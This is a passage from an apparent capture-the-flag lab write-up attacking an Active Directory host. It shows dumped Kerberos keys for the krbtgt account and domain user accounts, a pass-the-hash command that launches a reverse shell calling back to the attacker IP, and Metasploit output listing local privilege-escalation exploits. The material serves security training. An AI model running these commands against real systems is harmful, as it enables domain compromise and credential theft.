krbtgt:aes128-cts-hmac-sha1-96:19d9549f8e011231c9a755e0b7d7695f
krbtgt:des-cbc-md5:9bf8155161a8e09e
S.Moon:aes256-cts-hmac-sha1-96:48de57e200e25b1c3af677e7b51eee7c56aa414b9420578f0589cbb511289505
S.Moon:aes128-cts-hmac-sha1-96:f7caecaae1d9b440b9967018e3e51b9d
S.Moon:des-cbc-md5:2ab6a4c4c273d67a
R.Cold:aes256-cts-hmac-sha1-96:296926d640823978cfd8dea60b749e853a37f761446af0b395b631098a90140b
R.Cold:aes128-cts-hmac-sha1-96:309cb9b5651626b3a46b61d329a1cf6a
R.Cold:des-cbc-md5:91b91079a80dd9c1
G.Lors:aes256-cts-hmac-sha1-96:bfaf4779007a83d75a380271bce1604f68d76559456598a0411f0806492ff41e
G.Lors:aes128-cts-hmac-sha1-96:2691b47070c034f62ece4666dedf634d
G.Lors:des-cbc-md5:a8dffd9bd9768ad9
L.Kein:aes256-cts-hmac-sha1-96:c6e0c7ccb7dda382cb67568c46790fa76197a064d116f9c3174c371f9fd55b16
L.Kein:aes128-cts-hmac-sha1-96:de4fc76e315dd8575b53762ca0f02567
L.Kein:des-cbc-md5:9e34f7dc58a843b9
M.Gold:aes256-cts-hmac-sha1-96:c78fcdf6d24c4dc97c8529f4e553c8a40ce09f2bf7070015dadec0d6a0a2c2e9
M.Gold:aes128-cts-hmac-sha1-96:8e493fabfc5934d170803d9f72edba63
M.Gold:des-cbc-md5:c10ee3d32f404015
C.Bum:aes256-cts-hmac-sha1-96:13979a025f384f0a4bee1f2a9ce070153415401cac19a955aa4a481aaf756917
C.Bum:aes128-cts-hmac-sha1-96:4b55f9b30586369b51895978d156a487
C.Bum:des-cbc-md5:efea1abca840ba9b
W.Walker:aes256-cts-hmac-sha1-96:8550cc8578c70eac932e6ab1de4bbd1e89cf29c4e085d65e0b08fc612a6020c1
W.Walker:aes128-cts-hmac-sha1-96:c071b18454a6624ddde12c9ddf6d8d08
W.Walker:des-cbc-md5:efa25eeac237b5fe
I.Francis:aes256-cts-hmac-sha1-96:832a16b70c274b3304d1a7acad1436dd882da176328bd201720273661989dd30
I.Francis:aes128-cts-hmac-sha1-96:24de7c367fee08862eab61bca6c94ecd
I.Francis:des-cbc-md5:57aebf1af41ff768
D.Truff:aes256-cts-hmac-sha1-96:e3a0f167df5320065d33035d2dd9c8fc11d11d6444073b5f826b5a9dd7fb33ff
D.Truff:aes128-cts-hmac-sha1-96:972d4bd171f9ff3a09e1f7463fe32114
D.Truff:des-cbc-md5:febc6b491c197326
V.Stevens:aes256-cts-hmac-sha1-96:f6ef7602f72072c7d8d52fa5b2bc479ab20e6f9a69e190a9681901c46583a078
V.Stevens:aes128-cts-hmac-sha1-96:466605520d9643b9ea77016aa1d2d530
V.Stevens:des-cbc-md5:a8e54fb90154fdce
svc_apache:aes256-cts-hmac-sha1-96:582dc5b5e2db775a9dee7b4ebc55f58811548a0682ac4bceb21de579385be9c3
svc_apache:aes128-cts-hmac-sha1-96:9bc038f14a0a0ff99f90ee88eaa8e92f
svc_apache:des-cbc-md5:feb09ece8f3d453e
O.Possum:aes256-cts-hmac-sha1-96:042649ac9128597203cc88d0130af2708c1c77004c57b1c9979bb8c6af75b502
O.Possum:aes128-cts-hmac-sha1-96:fcb7ed22eb484c773969089fe39d9d40
O.Possum:des-cbc-md5:cdd0972cec1f2625
G0$:aes256-cts-hmac-sha1-96:11ad9a25157bdc6e7fd9df6c0872c33d790f7660c6f5e6ea526996b808e4d7bb
G0$:aes128-cts-hmac-sha1-96:fa0d7c35e273ae2121d1e3c54b19c3cf
G0$:des-cbc-md5:463d9edadc20e308
[*] Cleaning up...
```

### Shell via reverse ssh

```bash
┌──(bravosec㉿fsociety)-[~/htb/Flight]
└─$ nxc smb flight.htb -u 'administrator' -H ':43bbfc530bab76141b12c8446e30c17c' -x 'C:\ProgramData\client.exe -d 10.10.16.30:443'
SMB         10.129.228.120  445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         10.129.228.120  445    G0               [+] flight.htb\administrator:43bbfc530bab76141b12c8446e30c17c (Pwn3d!)
```

```bash
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\> whoami
flight\administrator
```


## Privilege escalation with S4U2self


## Privilege escalation with metasploit exploit suggester

```bash
smsf6 payload(windows/shell_reverse_tcp) > search suggester

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester


Interact with a module by name or index. For example info 0, use 0 or use post/multi/recon/local_exploit_suggester

msf6 payload(windows/shell_reverse_tcp) > use 0
msf6 post(multi/recon/local_exploit_suggester) > set session 4
session => 4
msf6 post(multi/recon/local_exploit_suggester) > exploit

[*] 10.129.228.120 - Collecting local exploits for x64/windows...
[*] 10.129.228.120 - 189 exploit checks are being tried...
[+] 10.129.228.120 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable.
[+] 10.129.228.120 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable.
[+] 10.129.228.120 - exploit/windows/local/bypassuac_sluihijack: The target appears to be vulnerable.
[+] 10.129.228.120 - exploit/windows/local/cve_2020_1048_printerdemon: The target appears to be vulnerable.
[+] 10.129.228.120 - exploit/windows/local/cve_2020_1337_printerdemon: The target appears to be vulnerable.
[+] 10.129.228.120 - exploit/windows/local/cve_2022_21882_win32k: The target appears to be vulnerable.
[+] 10.129.228.120 - exploit/windows/local/cve_2022_21999_spoolfool_privesc: The target appears to be vulnerable.
[+] 10.129.228.120 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[*] Running check method for exploit 45 / 45
[*] 10.129.228.120 - Valid modules for session 4:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_dotnet_profiler                Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/bypassuac_sdclt                          Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/bypassuac_sluihijack                     Yes                      The target appears to be vulnerable.
 4   exploit/windows/local/cve_2020_1048_printerdemon               Yes                      The target appears to be vulnerable.
 5   exploit/windows/local/cve_2020_1337_printerdemon               Yes                      The target appears to be vulnerable.
 6   exploit/windows/local/cve_2022_21882_win32k                    Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/cve_2022_21999_spoolfool_privesc         Yes                      The target appears to be vulnerable.
```